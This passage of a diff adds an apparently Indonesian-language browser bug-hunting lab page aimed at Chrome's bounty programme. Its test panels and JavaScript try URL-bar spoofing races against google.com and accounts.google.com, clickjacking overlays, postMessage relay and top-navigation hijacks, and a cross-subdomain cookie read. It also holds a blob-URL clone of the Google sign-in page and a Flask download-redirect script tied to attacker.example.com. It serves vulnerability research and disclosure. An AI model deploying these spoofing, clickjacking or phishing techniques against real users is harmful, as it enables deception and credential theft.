+<span style="color:#8b949e">&lt;!-- Bug: srcdoc bisa baca localStorage/cookie parent tanpa same-origin check? --&gt;</span></pre>
+    <div class="btn-group">
+      <button class="btn btn-red"    onclick="testV9a('origin')">Test: Origin &amp; Cookie Read</button>
+      <button class="btn btn-red"    onclick="testV9a('localstorage')">Test: localStorage Access</button>
+      <button class="btn btn-red"    onclick="testV9a('fetch')">Test: Fetch Parent Resources</button>
+      <button class="btn btn-purple" onclick="testV9a('nested')">Test: Nested srcdoc Escape</button>
+    </div>
+    <div id="v9a-container" style="margin-top:12px;border:1px solid var(--border);border-radius:6px;overflow:hidden;min-height:60px;background:var(--bg3)"></div>
+  </div>
+
+  <!-- V9b: Open Redirect iframe -->
+  <div id="v9p-redirect" class="v9-panel" style="display:none">
+    <h2>V9b — Open Redirect → iframe Content Spoof</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Jika trusted domain punya open redirect (<code>trusted.com/go?url=attacker.com</code>),
+      embed sebagai iframe <code>src</code>. Dari perspektif parent page, iframe src terlihat
+      dari <code>trusted.com</code>. Tapi content setelah redirect dari <code>attacker.com</code>.
+      Bug chain: CSP <code>frame-src trusted.com</code> bypass, atau
+      <code>postMessage</code> trust check yang hanya lihat initial src, bukan final destination.
+    </p>
+    <pre><span style="color:#8b949e">&lt;!-- Parent CSP: frame-src https://trusted.com --&gt;</span>
+&lt;iframe src=<span style="color:#ffa657">"https://trusted.com/redirect?url=https://attacker.com"</span>&gt;&lt;/iframe&gt;
+<span style="color:#8b949e">&lt;!-- iframe akhirnya load attacker.com — CSP bypass jika redirect diizinkan --&gt;</span>
+
+<span style="color:#8b949e">// postMessage trust yang salah:</span>
+window.addEventListener(<span style="color:#ffa657">'message'</span>, e =&gt; {
+  <span style="color:#8b949e">// Hanya cek e.origin pada saat pesan dikirim — bukan final iframe origin</span>
+  <span style="color:#79c0ff">if</span> (e.source === iframe.contentWindow) processMessage(e.data); <span style="color:#8b949e">// VULN</span>
+});</pre>
+    <div class="btn-group">
+      <button class="btn btn-red"    onclick="testV9b('local-redirect')">Local Redirect Test</button>
+      <button class="btn btn-red"    onclick="testV9b('csp-bypass')">CSP frame-src Bypass</button>
+      <button class="btn btn-red"    onclick="testV9b('postmsg-trust')">postMessage Trust Bypass</button>
+    </div>
+    <div id="v9b-container" style="margin-top:12px"></div>
+    <div class="log" id="v9b-log" style="margin-top:8px"><span class="log-info">→ Ready.</span></div>
+  </div>
+
+  <!-- V9c: Clickjacking -->
+  <div id="v9p-click" class="v9-panel" style="display:none">
+    <h2>V9c — Clickjacking &amp; UI Overlay</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Transparent/opaque iframe overlay di atas attacker-controlled UI untuk mengarahkan klik
+      user ke action pada framed page. Reportable di Chrome VRP jika target page
+      tidak mengirim <code>X-Frame-Options</code> atau <code>frame-ancestors</code> CSP
+      dan aksi yang terpengaruh adalah <strong>security-critical</strong>
+      (delete account, transfer, OAuth confirm, permission grant).
+    </p>
+    <div id="v9c-demo" style="position:relative;width:500px;max-width:100%;height:320px;
+      border:1px solid var(--border);border-radius:8px;overflow:hidden;margin:12px 0;background:#fff">
+      <!-- Decoy UI layer (user sees this) -->
+      <div id="v9c-decoy" style="position:absolute;top:0;left:0;width:100%;height:100%;
+        z-index:2;pointer-events:none;font-family:sans-serif;background:#f0f4ff;
+        display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px">
+        <div style="font-size:20px;font-weight:700;color:#333">Win a Prize! 🎁</div>
+        <div style="color:#666;font-size:14px">Click the button below to claim</div>
+        <div style="background:#4CAF50;color:#fff;padding:12px 32px;border-radius:6px;
+          font-size:15px;font-weight:600">CLAIM NOW</div>
+        <div style="font-size:11px;color:#999">100% free, no strings attached</div>
+      </div>
+      <!-- Transparent iframe victim layer -->
+      <iframe id="v9c-iframe" style="position:absolute;top:0;left:0;width:100%;height:100%;
+        z-index:1;border:none;opacity:0" src="about:blank"></iframe>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
+      <label style="font-size:12px;color:var(--dim)">iframe opacity</label>
+      <input type="range" min="0" max="100" value="0" style="flex:1;accent-color:var(--blue)"
+             oninput="document.getElementById('v9c-iframe').style.opacity=this.value/100;
+                      document.getElementById('v9c-op-val').textContent=this.value+'%'">
+      <span style="font-family:monospace;font-size:12px;color:var(--orange)" id="v9c-op-val">0%</span>
+    </div>
+    <div class="btn-group">
+      <button class="btn btn-red"    onclick="testV9c('framable')">Load Framable Target</button>
+      <button class="btn btn-red"    onclick="testV9c('oauth')">OAuth Confirm Overlay</button>
+      <button class="btn btn-red"    onclick="testV9c('drag')">Drag &amp; Drop Hijack</button>
+      <button class="btn btn-purple" onclick="testV9c('cursor')">Cursor Spoof</button>
+    </div>
+    <div class="log" id="v9c-log" style="margin-top:10px"><span class="log-info">→ Ready.</span></div>
+  </div>
+
+  <!-- V9d: postMessage Relay -->
+  <div id="v9p-postmsg" class="v9-panel" style="display:none">
+    <h2>V9d — postMessage Origin Relay Bypass</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      App A percaya pesan dari <code>trusted.com</code>. Attacker embed <code>trusted.com</code>
+      sebagai iframe, lalu kirim pesan ke iframe tersebut. Jika <code>trusted.com</code> memiliki
+      "relay" pattern (echo/forward pesan tanpa validasi), pesan attacker tiba di app A dengan
+      <code>e.origin = trusted.com</code>. Juga test: <code>targetOrigin="*"</code> leak dan
+      <code>MessageChannel</code> port transfer abuse.
+    </p>
+    <pre><span style="color:#8b949e">// Victim app — hanya percaya pesan dari trusted.com</span>
+window.addEventListener(<span style="color:#ffa657">'message'</span>, e =&gt; {
+  <span style="color:#79c0ff">if</span> (e.origin !== <span style="color:#ffa657">'https://trusted.com'</span>) <span style="color:#79c0ff">return</span>;
+  eval(e.data.code); <span style="color:#8b949e">// ← SINK</span>
+});
+
+<span style="color:#8b949e">// trusted.com punya relay yang naive:</span>
+window.addEventListener(<span style="color:#ffa657">'message'</span>, e =&gt; {
+  window.parent.postMessage(e.data, <span style="color:#ffa657">'*'</span>); <span style="color:#8b949e">// ← forward tanpa validasi origin</span>
+});</pre>
+    <div class="btn-group">
+      <button class="btn btn-red"    onclick="testV9d('relay-detect')">Detect Relay Pattern</button>
+      <button class="btn btn-red"    onclick="testV9d('wildcard-leak')">targetOrigin=* Leak</button>
+      <button class="btn btn-red"    onclick="testV9d('channel-hijack')">MessageChannel Hijack</button>
+      <button class="btn btn-red"    onclick="testV9d('frame-count')">Frame Count Oracle</button>
+    </div>
+    <div class="log" id="v9d-log" style="margin-top:10px"><span class="log-info">→ Ready.</span></div>
+  </div>
+
+  <!-- V9e: Top-Level Navigation Hijack -->
+  <div id="v9p-topnav" class="v9-panel" style="display:none">
+    <h2>V9e — Top-Level Navigation Hijack via iframe</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Sandboxed iframe dengan <code>allow-top-navigation</code> atau
+      <code>allow-top-navigation-by-user-activation</code> dapat navigate window.top.
+      Jika embed pihak ketiga (iklan, widget) punya flag ini, mereka bisa redirect seluruh
+      halaman ke attacker URL. Juga test: <code>_blank</code> target link dari cross-origin
+      iframe yang bisa memanipulasi opener.
+    </p>
+    <pre><span style="color:#8b949e">&lt;!-- Attacker-controlled iframe yang diembed oleh victim site --&gt;</span>
+&lt;iframe sandbox=<span style="color:#ffa657">"allow-scripts allow-top-navigation"</span>
+        src=<span style="color:#ffa657">"https://attacker.com/evil-ad"</span>&gt;&lt;/iframe&gt;
+
+<span style="color:#8b949e">&lt;!-- Di dalam evil-ad.html: --&gt;</span>
+&lt;script&gt;
+  top.location = <span style="color:#ffa657">'https://attacker.com/phishing-page'</span>;
+  <span style="color:#8b949e">// Entire victim page sekarang di-redirect ke attacker</span>
+&lt;/script&gt;</pre>
+    <div class="btn-group">
+      <button class="btn btn-red"    onclick="testV9e('top-nav')">Top-Nav from Sandbox</button>
+      <button class="btn btn-red"    onclick="testV9e('user-activation')">User-Activation Bypass</button>
+      <button class="btn btn-red"    onclick="testV9e('opener-null')">Opener Null Check</button>
+      <button class="btn btn-purple" onclick="testV9e('tab-napping')">Reverse Tabnapping</button>
+    </div>
+    <div class="log" id="v9e-log" style="margin-top:10px"><span class="log-info">→ Ready.</span></div>
+    <div id="v9e-container" style="margin-top:10px"></div>
+  </div>
+
+  <!-- V9f: document.domain -->
+  <div id="v9p-domdomain" class="v9-panel" style="display:none">
+    <h2>V9f — document.domain Relaxation &amp; Cross-Origin DOM Read</h2>
+    <p style="font-size:13px;color:var(--dim);margin:8px 0 12px">
+      Dua halaman dari subdomain berbeda (<code>a.example.com</code> dan <code>b.example.com</code>)
+      yang sama-sama set <code>document.domain = "example.com"</code> menjadi same-origin satu sama lain.
+      Chrome 106+ mulai deprecate ini via Origin-Agent-Cluster, tapi masih ada bypass.
+      Bug target: apakah masih ada path untuk relax <code>document.domain</code> dan
+      baca DOM cross-subdomain?
+    </p>
+    <pre><span style="color:#8b949e">// Page A: a.localhost / Page B: b.localhost</span>
+<span style="color:#8b949e">// Keduanya set:</span>
+document.domain = <span style="color:#ffa657">"localhost"</span>;
+
+<span style="color:#8b949e">// Setelah itu, A bisa akses B's DOM:</span>
+<span style="color:#79c0ff">const</span> iframe = document.querySelector(<span style="color:#ffa657">'iframe'</span>); <span style="color:#8b949e">// src=b.localhost</span>
+console.log(iframe.contentDocument.cookie); <span style="color:#8b949e">// cross-subdomain cookie theft</span>
+
+<span style="color:#8b949e">// Chrome 106+: blocked by Origin-Agent-Cluster header</span>
+<span style="color:#8b949e">// Test: apakah masih ada bypass via null origin / data: iframe / srcdoc chain?</span></pre>
+    <div class="btn-group">
+      <button class="btn btn-red"    onclick="testV9f('same-site')">Same-Site Relaxation</button>
+      <button class="btn btn-red"    onclick="testV9f('null-bypass')">Null Origin Bypass</button>
+      <button class="btn btn-red"    onclick="testV9f('oac-check')">Origin-Agent-Cluster Check</button>
+    </div>
+    <div class="log" id="v9f-log" style="margin-top:10px"><span class="log-info">→ Ready.</span></div>
+    <div id="v9f-container" style="margin-top:10px"></div>
+  </div>
+
+  <!-- Shared log -->
+  <div class="log" id="v9-log" style="margin-top:14px"><span class="log-info">→ Select sub-vector above.</span></div>
+
+  <div class="alert alert-warn" style="margin-top:12px">
+    🎯 <strong>Severity guide:</strong>
+    V9e top-nav dari sandboxed iframe = High $8K+ (full page redirect dari embed) ·
+    V9d postMessage relay bypass = High $10K+ (trust model bypass, impact tergantung sink) ·
+    V9c clickjacking pada OAuth/payment = High $5K–$15K ·
+    V9a srcdoc DOM read lintas-context = Medium $3K–$5K
+  </div>
+</div>
+
+<!-- ══ Observer Notes ══ -->
+<hr class="divider" id="notes">
+<div class="card">
+  <div class="card-header">
+    <span class="vec-id" style="color:var(--green)">NOTES</span>
+    <h2>Observer Notes — Record Findings</h2>
+  </div>
+
+  <textarea id="notes-text" style="width:100%;background:var(--bg3);border:1px solid var(--border);
+    border-radius:6px;padding:12px;color:var(--text);font-family:monospace;font-size:12px;
+    resize:vertical;min-height:140px;outline:none"
+    placeholder="Catat hasil observasi di sini...
+Contoh:
+[V1] delay=80ms → popup URL bar tetap tunjuk google.com setelah 3 detik
+[V2] ERR_ABORTED → document.write() berhasil, URL bar: accounts.google.com → POTENTIAL BUG
+[Chrome version: Canary 127.0.0.1 / Stable 126.x]"></textarea>
+
+  <div class="btn-group">
+    <button class="btn btn-green" onclick="exportNotes()">📤 Export Report</button>
+    <button class="btn" onclick="document.getElementById('notes-text').value=''">Clear</button>
+  </div>
+
+  <div class="alert alert-success" style="margin-top:12px">
+    <strong>Cara submit ke Chrome VRP setelah temukan bug:</strong><br>
+    1. Buat minimal reproducer (HTML &lt; 20 baris)<br>
+    2. Test di Canary + Stable, catat versi<br>
+    3. Screenshot/record video URL bar yang spoofed<br>
+    4. Submit ke <code>issues.chromium.org</code> → New Issue → Security Bug
+  </div>
+</div>
+
+</main>
+</div>
+
+<script>
+// ─────────────────────────────────────────────────────────
+// State
+// ─────────────────────────────────────────────────────────
+let v1Delay = 50, v3Delay = 10;
+let v1SweepActive = false, v3SweepActive = false;
+let popupRefs = [];
+
+function log(id, msg, type='info') {
+  const el = document.getElementById(id);
+  const line = document.createElement('div');
+  line.className = `log-line log-${type}`;
+  const ts = new Date().toLocaleTimeString('en-GB', {hour12:false});
+  line.textContent = `[${ts}] ${msg}`;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+}
+
+function clearAllLogs() {
+  ['v1-log','v2-log','v3-log','v4-log','v5-log','v6-log','v7-log'].forEach(id => {
+    document.getElementById(id).innerHTML = '<span class="log-info">→ Cleared.</span>';
+  });
+}
+
+function hint(msg) {
+  document.getElementById('overlay-text').textContent = msg;
+  document.getElementById('overlay-hint').style.display = 'block';
+  setTimeout(() => document.getElementById('overlay-hint').style.display = 'none', 5000);
+}
+
+// ─────────────────────────────────────────────────────────
+// V1: Navigation Timing Race
+// ─────────────────────────────────────────────────────────
+function testV1(delay) {
+  const d = delay !== undefined ? delay : v1Delay;
+  log('v1-log', `Opening popup → google.com, race at ${d}ms...`, 'info');
+
+  const popup = window.open('https://www.google.com', '_blank',
+    'width=900,height=600,toolbar=yes,location=yes,status=yes');
+
+  if (!popup) {
+    log('v1-log', '✗ Popup blocked! Allow popups for localhost.', 'err');
+    return;
+  }
+  popupRefs.push(popup);
+
+  setTimeout(() => {
+    try {
+      popup.location.href = 'about:blank';
+      log('v1-log', `[${d}ms] Navigated popup to about:blank`, 'warn');
+      hint(`[V1 @${d}ms] Check popup URL bar — still shows google.com?`);
+    } catch(e) {
+      log('v1-log', `[${d}ms] Cross-origin block (expected): ${e.message}`, 'err');
+    }
+
+    setTimeout(() => {
+      try {
+        popup.document.write(`
+          <style>body{margin:0;font-family:sans-serif;background:#fff}</style>
+          <div style="background:#4285f4;padding:16px;color:#fff;font-size:20px;font-weight:bold">
+            Google — Attacker Content
+          </div>
+          <p style="padding:20px">
+            URL bar says: <strong>google.com</strong><br>
+            Content from: <strong>attacker (localhost)</strong><br>
+            Delay used: <strong>${d}ms</strong>
+          </p>`);
+        log('v1-log', `[${d}ms] document.write() succeeded → CHECK URL BAR`, 'ok');
+        hint(`🚨 [V1 @${d}ms] document.write() worked! URL bar still google.com?`);
+      } catch(e2) {
+        log('v1-log', `[${d}ms] document.write() blocked (expected if race lost): ${e2.message}`, 'err');
+      }
+    }, 100);
+  }, d);
+}
+
+function testV1Variants() {
+  v1SweepActive = true;
+  let delays = [0, 10, 20, 30, 50, 80, 100, 150, 200, 300, 500];
+  let i = 0;
+  log('v1-log', `Auto sweep: testing ${delays.length} delay values...`, 'info');
+
+  function next() {
+    if (!v1SweepActive || i >= delays.length) {
+      log('v1-log', 'Sweep complete.', 'info');
+      return;
+    }
+    testV1(delays[i++]);
+    setTimeout(next, 4000);
+  }
+  next();
+}
+
+function testV1Stop() {
+  v1SweepActive = false;
+  popupRefs.forEach(p => { try { p.close(); } catch(e){} });
+  popupRefs = [];
+  log('v1-log', 'Stopped. All popups closed.', 'warn');
+}
+
+// ─────────────────────────────────────────────────────────
+// V2: Error Page Race
+// ─────────────────────────────────────────────────────────
+function testV2(mode) {
+  let targetURL;
+  if (mode === 'abort') {
+    // URL that should cause ERR_ABORTED
+    targetURL = 'https://accounts.google.com/NONEXISTENT_PATH_404_ABORT';
+  } else if (mode === 'refused') {
+    targetURL = 'http://localhost:19999/nonexistent'; // likely refused
+  } else {
+    // Timeout via invalid IP (RFC 5737 test address)
+    targetURL = 'http://192.0.2.1/page'; // TEST-NET-1, should timeout
+  }
+
+  log('v2-log', `Opening popup → ${targetURL}`, 'info');
+  hint(`[V2 ${mode}] Watch URL bar — try ${targetURL}`);
+
+  const popup = window.open(targetURL, '_blank', 'width=900,height=600,toolbar=yes,location=yes');
+  if (!popup) { log('v2-log', '✗ Popup blocked!', 'err'); return; }
+  popupRefs.push(popup);
+
+  // Race: try to write content after error
+  [50, 150, 300, 600, 1200].forEach(d => {
+    setTimeout(() => {
+      try {
+        const ref = popup.document;
+        if (ref) {
+          ref.write(`<h2>Error Race Test @ ${d}ms</h2>
+            <p>If URL bar still shows <b>${new URL(targetURL).hostname}</b> → BUG</p>`);
+          log('v2-log', `[${d}ms] document.write() succeeded → CHECK URL BAR NOW`, 'ok');
+          hint(`🚨 [V2 @${d}ms] Write worked — URL bar shows ${new URL(targetURL).hostname}?`);
+        }
+      } catch(e) {
+        log('v2-log', `[${d}ms] Blocked: ${e.message.substring(0,60)}`, 'err');
+      }
+    }, d);
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// V3: History pushState Race
+// ─────────────────────────────────────────────────────────
+function testV3(delay) {
+  const d = delay !== undefined ? delay : v3Delay;
+  const targetOrigin = 'https://accounts.google.com';
+  log('v3-log', `Racing pushState against navigation to ${targetOrigin} @${d}ms`, 'info');
+
+  const popup = window.open(targetOrigin, '_blank', 'width=900,height=600,toolbar=yes,location=yes');
+  if (!popup) { log('v3-log', '✗ Popup blocked!', 'err'); return; }
+  popupRefs.push(popup);
+
+  setTimeout(() => {
+    try {
+      // Attempt to manipulate history before navigation commits
+      popup.history.pushState({}, '', '/fake-path-spoof');
+      log('v3-log', `[${d}ms] pushState succeeded → URL bar should show /fake-path-spoof`, 'ok');
+      hint(`🚨 [V3 @${d}ms] pushState worked on cross-origin popup!`);
+    } catch(e) {
+      log('v3-log', `[${d}ms] pushState blocked (expected): ${e.message.substring(0,70)}`, 'err');
+    }
+  }, d);
+}
+
+function testV3Sweep() {
+  v3SweepActive = true;
+  [0, 5, 10, 20, 40, 70, 100, 150, 250].forEach((d, i) => {
+    setTimeout(() => {
+      if (!v3SweepActive) return;
+      testV3(d);
+    }, i * 3500);
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// V4: Download Redirect Spoof
+// ─────────────────────────────────────────────────────────
+function testV4Local() {
+  // Create a local page that redirects to a download on another domain
+  const redirectHTML = `<!DOCTYPE html>
+<html><head>
+<meta http-equiv="refresh" content="0;url=https://www.w3.org/WAI/WCAG21/Techniques/pdf/PDF1">
+</head><body>Redirecting to download...</body></html>`;
+
+  const blob = new Blob([redirectHTML], {type: 'text/html'});
+  const url = URL.createObjectURL(blob);
+  window.open(url, '_blank', 'width=900,height=600,toolbar=yes,location=yes');
+  log('v4-log', 'Opened blob: redirect page — check download attribution in Chrome download bar', 'warn');
+  hint('[V4] Watch Chrome download bar — which domain is shown as source?');
+}
+
+function copyV4Script() {
+  const script = `#!/usr/bin/env python3
+from flask import Flask, redirect, Response
+app = Flask(__name__)
+
+@app.route('/evil-download')
+def evil():
+    # User clicks link to attacker.example.com/evil-download
+    # Chrome follows redirect to legitimate domain
+    # Bug: download bar shows legitimate domain as trusted source
+    response = redirect('https://accounts.google.com/sitemap.xml', 302)
+    response.headers['Content-Disposition'] = 'attachment; filename=important-document.pdf'
+    return response
+
+@app.route('/')
+def index():
+    return '<a href="/evil-download">Download Important Document</a>'
+
+if __name__ == '__main__':
+    app.run(port=8081, debug=True)
+`;
+  navigator.clipboard.writeText(script).then(() => {
+    log('v4-log', 'Server script copied! Run: pip install flask && python3 redirect_server.py', 'ok');
+  });
+}
+
+// ─────────────────────────────────────────────────────────
+// V5: about:blank Opener
+// ─────────────────────────────────────────────────────────
+function testV5(mode) {
+  if (mode === 'basic') {
+    const popup = window.open('about:blank', '_blank', 'width=900,height=600,toolbar=yes,location=yes');
+    if (!popup) { log('v5-log', '✗ Popup blocked!', 'err'); return; }
+    popupRefs.push(popup);
+
+    popup.document.write(`
+      <html><head><title>about:blank test</title></head>
+      <body style="font-family:monospace;padding:20px;background:#0d1117;color:#c9d1d9">
+        <h2 style="color:#58a6ff">about:blank Opener Test</h2>
+        <p>window.origin = <strong style="color:#ffa657">${window.location.origin}</strong></p>
+        <p>document.domain = <strong style="color:#ffa657">${window.location.hostname}</strong></p>
+        <p>URL bar shows: <strong>about:blank</strong></p>
+        <p style="color:#56d364">✓ Opener can write content (expected).</p>
+        <p>
+          🎯 Bug to look for: can opener make this page <em>appear</em> to be
+          from a different origin via permission dialogs or other UI?
+        </p>
+        <button onclick="navigator.geolocation.getCurrentPosition(()=>{})"
+          style="padding:8px 14px;background:#21262d;border:1px solid #30363d;
+                 color:#c9d1d9;border-radius:6px;cursor:pointer">
+          Request Geolocation — check permission dialog origin
+        </button>
+      </body></html>`);
+    log('v5-log', 'about:blank popup opened with opener content — check permission dialog', 'ok');
+    hint('[V5] Click "Request Geolocation" in popup — which origin shows in permission dialog?');
+
+  } else if (mode === 'permission') {
+    // Open about:blank then immediately request getUserMedia
+    const popup = window.open('about:blank', '_blank', 'width=700,height=500,toolbar=yes,location=yes');
+    if (!popup) { log('v5-log', '✗ Popup blocked!', 'err'); return; }
+    popupRefs.push(popup);
+
+    popup.document.write(`
+      <html><body style="padding:20px;font-family:sans-serif">
+        <h3>Permission Test</h3>
+        <p>Which origin appears in the camera/mic permission dialog?</p>
+        <button id="btn" style="padding:10px 20px;font-size:14px;cursor:pointer"
+          onclick="
+            navigator.mediaDevices.getUserMedia({video:true,audio:true})
+              .then(s=>{document.getElementById('result').textContent='Granted! Origin in dialog was: '+window.location.origin;s.getTracks().forEach(t=>t.stop())})
+              .catch(e=>document.getElementById('result').textContent='Error: '+e.message)
+          ">
+          Request Camera + Microphone
+        </button>
+        <p id="result" style="color:green;margin-top:10px"></p>
+      </body></html>`);
+    log('v5-log', 'Permission dialog test ready in popup — click the button', 'warn');
+    hint('[V5 permission] Watch which origin Chrome shows in the permission dialog!');
+
+  } else if (mode === 'urlbar') {
+    // Try to navigate about:blank to a fake URL via history API
+    const popup = window.open('about:blank', '_blank', 'width=900,height=600,toolbar=yes,location=yes');
+    if (!popup) { log('v5-log', '✗ Popup blocked!', 'err'); return; }
+    popupRefs.push(popup);
+
+    popup.document.write('<html><head></head><body></body></html>');
+    setTimeout(() => {
+      try {
+        popup.history.pushState({}, '', 'https://google.com/spoofed-path');
+        log('v5-log', 'pushState on about:blank popup SUCCEEDED → URL bar spoofed?', 'ok');
+        hint('🚨 [V5] pushState from about:blank worked — check URL bar!');
+      } catch(e) {
+        try {
+          popup.history.pushState({}, '', '/local-path');
+          log('v5-log', 'pushState to local path succeeded (origin preserved)', 'warn');
+        } catch(e2) {
+          log('v5-log', `pushState blocked: ${e2.message}`, 'err');
+        }
+      }
+    }, 100);
+  }
+}
+
+// ─────────────────────────────────────────────────────────
+// V6: Blob URL Spoof
+// ─────────────────────────────────────────────────────────
+function testV6(mode) {
+  if (mode === 'basic') {
+    const html = `<!DOCTYPE html><html><head><title>Test</title></head>
+<body style="font-family:sans-serif;padding:30px;background:#fff">
+  <h2>Blob URL Test</h2>
+  <p>URL bar shows: <code>blob:http://localhost/...</code></p>
+  <p>Content from: localhost (attacker)</p>
+  <p style="color:red">Open DevTools → Console → type: <strong>window.origin</strong></p>
+</body></html>`;
+    const url = URL.createObjectURL(new Blob([html], {type: 'text/html'}));
+    window.open(url, '_blank', 'width=800,height=500,toolbar=yes,location=yes');
+    log('v6-log', `Blob URL opened: ${url.substring(0,60)}... — observe URL bar format`, 'ok');
+
+  } else if (mode === 'login') {
+    const html = `<!DOCTYPE html><html>
+<head><title>Google — Sign in</title>
+<style>*{box-sizing:border-box}body{margin:0;font-family:'Google Sans',sans-serif;background:#fff}
+.wrap{display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;max-width:400px;width:100%;text-align:center}
+img{width:75px;margin-bottom:16px}h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}
+p{font-size:14px;color:#5f6368;margin:0 0 24px}input{width:100%;padding:13px 15px;border:1px solid #dadce0;
+border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}
+.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;
+font-size:14px;cursor:pointer;float:right}</style></head>
+<body><div class="wrap"><div class="card">
+  <svg height="48" viewBox="0 0 48 48" width="48"><path d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z" fill="#FFC107"/><path d="M6.3 14.7l7.1 5.1C15.1 17 19.3 14 24 14c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 16.3 2 9.7 7.5 6.3 14.7z" fill="#FF3D00"/><path d="M24 46c5.9 0 10.9-2 14.6-5.3l-6.8-5.7C29.8 36.8 27.1 38 24 38c-6.1 0-10.7-3.9-11.7-9.2L5 34.2C8.2 41.2 15.4 46 24 46z" fill="#4CAF50"/><path d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z" fill="none"/></svg>
+  <h1>Sign in</h1>
+  <p>to continue to Google</p>
+  <input type="email" placeholder="Email or phone">
+  <input type="password" placeholder="Password">
+  <button class="btn" onclick="alert('Demo only — no data sent')">Next</button>
+  <p style="margin-top:20px;font-size:12px;color:#999">URL bar shows blob:// — not google.com<br>This demonstrates visual phishing chain</p>
+</div></div></body></html>`;
+    const url = URL.createObjectURL(new Blob([html], {type: 'text/html'}));
+    const popup = window.open(url, '_blank', 'width=500,height:650,toolbar=yes,location=yes');
+    log('v6-log', 'Fake Google login via blob: URL — observe URL bar and visual trustworthiness', 'warn');
+    hint('[V6] URL bar: blob://localhost/... but looks like Google login. Chain with URL bar hide?');
+
+  } else if (mode === 'permission') {
+    const html = `<!DOCTYPE html><html><body style="padding:20px;font-family:sans-serif">
+<h3>blob: Permission Origin Test</h3>
+<p>Which origin shows in permission dialog when blob: page asks for media?</p>
+<button onclick="navigator.mediaDevices.getUserMedia({video:true})
+  .then(s=>{document.querySelector('p.r').textContent='Granted — check what Chrome showed';s.getTracks().forEach(t=>t.stop())})
+  .catch(e=>document.querySelector('p.r').textContent=e.message)"
+  style="padding:10px 20px;font-size:15px;cursor:pointer">
+  Request Camera Permission
+</button>
+<p class="r" style="color:green;margin-top:10px"></p>
+<p style="font-size:12px;color:#666">window.origin = ${window.location.origin}</p>
+</body></html>`;
+    const url = URL.createObjectURL(new Blob([html], {type: 'text/html'}));
+    window.open(url, '_blank', 'width=700,height=450,toolbar=yes,location=yes');
+    log('v6-log', 'blob: permission test opened — does Chrome show "localhost" or "blob:localhost" in dialog?', 'warn');
+    hint('[V6] Check what origin Chrome shows in the camera permission dialog');
+
+  } else if (mode === 'kiosk') {
+    const html = `<!DOCTYPE html><html>
+<head><title>Fullscreen + Blob Test</title></head>
+<body style="margin:0;font-family:sans-serif;background:#1a1a2e;color:#fff">
+  <div id="content" style="padding:30px">
+    <h2>Fullscreen + Blob URL Test</h2>
+    <p>If we enter fullscreen from a blob: URL, the browser should show a fullscreen indicator.
+       The URL bar is hidden in fullscreen — this is the key phishing chain.</p>
+    <button id="fsBtn" style="padding:12px 24px;font-size:16px;background:#e94560;
+      border:none;color:#fff;border-radius:6px;cursor:pointer;margin-top:20px"
+      onclick="document.documentElement.requestFullscreen()">
+      Enter Fullscreen
+    </button>
+    <p style="margin-top:20px;font-size:13px;color:#888">
+      In fullscreen: URL bar hidden, origin unknown to user<br>
+      Press Escape to exit fullscreen
+    </p>
+  </div>
+</body></html>`;
+    const url = URL.createObjectURL(new Blob([html], {type: 'text/html'}));
+    window.open(url, '_blank', 'width=900,height=600,toolbar=yes,location=yes');
+    log('v6-log', 'Fullscreen blob test — in fullscreen, URL bar is hidden. Phishing chain opportunity.', 'warn');
+  }
+}
+
+// ─────────────────────────────────────────────────────────
+// V7: javascript: URL
+// ─────────────────────────────────────────────────────────
+function testV7(mode) {
+  if (mode === 'popup') {
+    const payload = `javascript:document.write('<html><body style="padding:20px;font-family:sans-serif"><h2>javascript: URL Popup</h2><p>window.origin = ' + window.origin + '</p><p>URL bar shows: (check above)</p><p style="color:green">Does Chrome show &quot;javascript:...&quot; or something else?</p></body></html>')`;
+    const popup = window.open(payload, '_blank', 'width=700,height=400,toolbar=yes,location=yes');
+    if (!popup) { log('v7-log', '✗ Popup blocked or javascript: URL rejected', 'err'); return; }
+    log('v7-log', 'javascript: URL popup opened — observe URL bar content', 'warn');
+    hint('[V7] javascript: popup — what does the URL bar show?');
+
+  } else if (mode === 'iframe') {
+    const iframe = document.createElement('iframe');
+    iframe.src = 'javascript:document.write("<p>javascript: iframe</p><p>origin: "+window.origin)';
+    iframe.style.cssText = 'width:100%;height:120px;border:1px solid #30363d;border-radius:6px;margin-top:10px;background:#fff';
+    document.getElementById('v7-log').parentElement.appendChild(iframe);
+    log('v7-log', 'javascript: iframe appended below this card', 'ok');
+
+  } else if (mode === 'anchor') {
+    const a = document.createElement('a');
+    a.href = `javascript:alert('Origin: ' + window.location.origin)`;
+    a.textContent = '← Click this javascript: link';
+    a.style.cssText = 'color:#58a6ff;display:block;margin-top:10px;cursor:pointer';
+    document.getElementById('v7-log').parentElement.appendChild(a);
+    log('v7-log', 'javascript: link added — click it and observe URL bar behavior', 'warn');
+
+  } else if (mode === 'location') {
+    try {
+      const popup = window.open('about:blank', '_blank', 'width=700,height=400,toolbar=yes,location=yes');
+      if (!popup) { log('v7-log', '✗ Popup blocked!', 'err'); return; }
+      popupRefs.push(popup);
